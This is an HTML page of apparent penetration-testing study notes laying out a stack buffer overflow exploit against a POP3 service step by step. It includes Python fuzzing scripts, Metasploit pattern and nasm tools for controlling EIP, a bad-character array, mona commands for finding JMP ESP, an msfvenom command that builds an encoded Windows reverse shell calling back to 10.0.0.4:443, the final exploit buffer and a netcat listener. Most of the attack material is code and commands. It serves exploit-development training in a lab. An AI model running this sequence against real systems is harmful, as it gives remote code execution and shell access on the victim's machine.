<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Method</title>
</head><body><b>Buffer Overflow <br/>
<br/>
<u>Fuzzing</u><br/>
<br/>
</b><b>Info: </b>Send malformed data into application input and watch for unexpected crashes. <br/>
<br/>
<b>Python-Script to connect to a port and send data<br/>
<br/>
</b>#!/usr/bin/python<br/>
import socket<br/>
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br/>
try:<ul><li style="list-style-type: none">print "\nSending evil buffer..." </li>
<li style="list-style-type: none">s.connect(('10.0.0.22',110)) &#09;&#09;# connect to IP, POP3 port </li>
<li style="list-style-type: none">data = s.recv(1024) &#09;&#09;&#09;# receive banner</li>
<li style="list-style-type: none">print data &#09;&#09;&#09;&#09;&#09;# print banner</li>
<li style="list-style-type: none">s.send('USER test' +'\r\n') &#09;&#09;# send username "test" </li>
<li style="list-style-type: none">data = s.recv(1024) &#09;&#09;&#09;# receive reply</li>
<li style="list-style-type: none">print data &#09;&#09;&#09;&#09;&#09;# print reply</li>
<li style="list-style-type: none">s.send('PASS test\r\n') &#09;&#09;&#09;# send password "test" </li>
<li style="list-style-type: none">data = s.recv(1024) &nbsp;&#09;&#09;&#09;# receive reply</li>
<li style="list-style-type: none">print data &#09;&#09;&#09;&#09;&#09;# print reply</li>
<li style="list-style-type: none">s.close() &#09;&#09;&#09;&#09;&#09;&#09;# close socket</li>
<li style="list-style-type: none">print "\nDone!"</li>
</ul>
except:<br/>
print "Could not connect to POP3!”<br/>
<br/>
<br/>
<b>Python-Scipt to Fuzz by sending increasing sizes of data<br/>
<br/>
</b>#!/usr/bin/python <br/>
import socket<br/>
<br/>
# Create an array of buffers, from 1 to 5900, with increments of 200. <br/>
buffer=["A"]<br/>
counter=100<br/>
while len(buffer) &lt;= 30:<ul><li style="list-style-type: none">buffer.append("A"*counter) </li>
<li style="list-style-type: none">counter=counter+200</li>
</ul>
<br/>
for string in buffer:<ul><li style="list-style-type: none">print "Fuzzing PASS with %s bytes" % len(string) </li>
<li style="list-style-type: none">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) </li>
<li style="list-style-type: none">connect=s.connect(('10.0.0.22',110))</li>
<li style="list-style-type: none">s.recv(1024)</li>
<li style="list-style-type: none">s.send('USER test\r\n')</li>
<li style="list-style-type: none">s.recv(1024)</li>
<li style="list-style-type: none">s.send('PASS ' + string + '\r\n') </li>
<li style="list-style-type: none">s.send('QUIT\r\n')</li>
<li style="list-style-type: none">s.close()</li>
</ul>
<br/>
<b><br/>
</b><b>Python-Scipt to Fuzz by sending one buffer</b><br/>
<br/>
#!/usr/bin/python<br/>
import socket<br/>
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br/>
buffer = 'A' * 2700<br/>
try:<ul><li style="list-style-type: none">print "\nSending evil buffer..." </li>
<li style="list-style-type: none">s.connect(('10.0.0.22',110)) </li>
<li style="list-style-type: none">data = s.recv(1024)</li>
<li style="list-style-type: none">s.send('USER username' +'\r\n') </li>
<li style="list-style-type: none">data = s.recv(1024)</li>
<li style="list-style-type: none">s.send('PASS ' + buffer + '\r\n')</li>
<li style="list-style-type: none">print "\nDone!." </li>
</ul>
except:<br/>
print "Could not connect to POP3!"<br/>
<br/>
<b><i><br/>
Note: For Windows attach the program to immunity Debugger<br/>
Note: For Linux next steps attach the program to &nbsp;(Evans Debugger)<br/>
<br/>
</i></b>root@kali:~# edb --run /usr/games/crossfire/bin/crossfire<br/>
<br/>
<b>Hint:</b>&nbsp;EDB Debugger pauses application at start, so hit run twice to allow the program to execute.<br/>
<br/>
<b><u>Control EIP<br/>
<br/>
</u></b><b>Info: </b>The Execution Instruction Pointer (EIP) register contains the next instruction to be executed<br/>
<br/>
<b>Locate the EIP by sending a unique string:</b><br/>
<br/>
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700<br/>
<br/>
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438<br/>
<br/>
Note: 39694438 = EIP value at crash.<br/>
Note: Execution Stack Pointer (ESP) value at crash<br/>
<br/>
<br/>
<b><u>Locate space for Shellcode<br/>
<br/>
</u></b><b>Info: </b>Standard shell reverse payload required 350-400 bytes. <br/>
<br/>
Increase buffer size to see how much data can be sent with the crash still occuring in the same manner. <br/>
Inspect where the ESP points to by following in dump. <br/>
Locate the space where a payload will fit. <br/>
<br/>
<u><b>Check for Bad Characters<br/>
<br/>
</b></u><b>Info</b>: Some applications may have bad characters that should not be sent in the buffer. <b><br/>
</b><b><br/>
Send all the possible hex values in the buffer:<br/>
<br/>
<br/>
</b>badchars = ( <b><br/>
</b>"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" <br/>
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" <br/>
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" <br/>
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" <br/>
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" <br/>
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" <br/>
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"<br/>
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" <br/>
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" <br/>
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" <br/>
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" <br/>
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" <br/>
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" <br/>
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" <br/>
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" <br/>
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )<br/>
<br/>
<b>Inspect the memory dump for ESP register and see which values do not show up. <br/>
Remove these values from the badchars and send again. <br/>
</b><b>Repeat till the memory dump for the ESP register contains all the badchars sent. </b><br/>
<br/>
<br/>
<b><u>Redirect Execution Flow<br/>
<br/>
</u></b><b>Info: </b>Using the EIP, we need to redirect the execution flow to the ESP register where the payload is stored. Can't hardcode the ESP register value as this changes on each run.<br/>
<br/>
<b>Find a return address: </b><br/>
<br/>
Find a reliable address in memory that contains the JMP ESP instruction. <br/>
Use mona.py module to find a module that:<ul><li style="list-style-type: none">1) has no memory protections such as DEP or ASLR (If DEP is enabled then the JMP ESP instruction would have to be located in a segment with Read (R) and Executable (E) permissions.</li>
<li style="list-style-type: none">2) has a memory range that does not contain bad characters</li>
</ul>
<br/>
<b>Run: </b>!mona modules //Note: This is done using the input bar at the bottom of the immunity debugger mian window. <br/>
<br/>
Identify the module in the list that satisfies the criteria above. <br/>
<br/>
<b>Find the opcode equivalent to JMP ESP</b><br/>
<br/>
root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb <br/>
nasm &gt; jmp esp<br/>
00000000 FFE4 &#09;jmp esp<br/>
<br/>
<b>Find a JMP ESP instruction within the module. </b><br/>
<br/>
!mona find -s "\xff\xe4" -m &lt;module name&gt;<br/>
<br/>
Note: Choose the address that contains no bad characters. <br/>
<br/>
<b>Change the Buffer to include the JMP ESP command address:</b><br/>
<br/>
Remember x86 architecture stores addresses in little endian format and therefore the return address has to be written the "wrong way round"<br/>
<br/>
<br/>
<b>Generate Shellcode with metasploit<br/>
<br/>
</b>root@kali:~# msfvenom -l payloads<br/>
<br/>
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"<br/>
<br/>
Note: <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">LHOST = ip address of where the reverse shell will connect to</li>
<li style="list-style-type: none">LPORT = Port of where the reverse shell will connect to</li>
<li style="list-style-type: none">-f = format of code. Value c = the code will be formatted in C</li>
<li style="list-style-type: none">-e = set encoder. value x86/shikata_ga_nai = encoder method</li>
<li style="list-style-type: none">-b = bad characters to omit from the payload</li>
<li style="list-style-type: none">EXITFUNC = setting the method that the shelllcode will take on exit. If a program is threaded then this value can be set to thread to avoid killing the whole service and thereby crashing it. </li>
</ul>
</li>
</ul>
<b><br/>
Alter the buffer to include the filler, return address, NOPs (an instruction to just pass onto the next instruction) and the shellcode <br/>
<br/>
</b>buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode<b><br/>
</b><b><br/>
</b><b>Set up the listener</b><br/>
<br/>
root@kali:~# nc -nlvp 443<br/>
<br/>
<br/>
<b>Send the exploit<br/>
<br/>
</b>root@kali:~# python exploit.py<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>